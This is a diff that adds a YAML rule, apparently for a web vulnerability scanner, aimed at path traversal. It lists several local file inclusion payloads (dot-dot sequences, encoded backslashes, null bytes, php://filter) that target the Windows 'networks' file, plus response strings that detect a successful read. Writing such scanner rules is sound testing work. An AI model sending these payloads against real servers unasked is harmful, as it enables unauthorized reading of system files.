@@ -1,0 +1,30 @@
+generate:
+  - payload:
+    # LFI
+    - "../../../../../../../../../../../../../../../../windows/system32/drivers/etc/networks\x00"
+    - "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5cnetworks%00"
+    - file://c:\windows\system32\drivers\etc\networks\x00
+    - "php://filter/convert.base64-encode/resource=../../../../../../../../../../../../../../../../windows/system32/drivers/etc/networks\x00"
+
+  - method:
+    - prefix
+
+detect:
+  - response:
+    - body: 'IyBDb3B5cmlnaHQgKGMpIDE5OTMtMTk5OSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBmaWxlIGNvb' #part of base64 < windows/system32/drivers/etc/networks
+    - body: '#    campus       284.122.107'
+
+meta-info:
+  - type: ptrav
+  - threat: 80
+  - tags:
+    - Path Traversal
+    - Arbitrary File Reading
+    - Misconfiguration
+    - Insecure Direct Object References
+    - Broken Access Control
+    - OWASP
+    - OWASP Top-10
+    - A4:2010
+    - A4:2013
+    - A5:2017
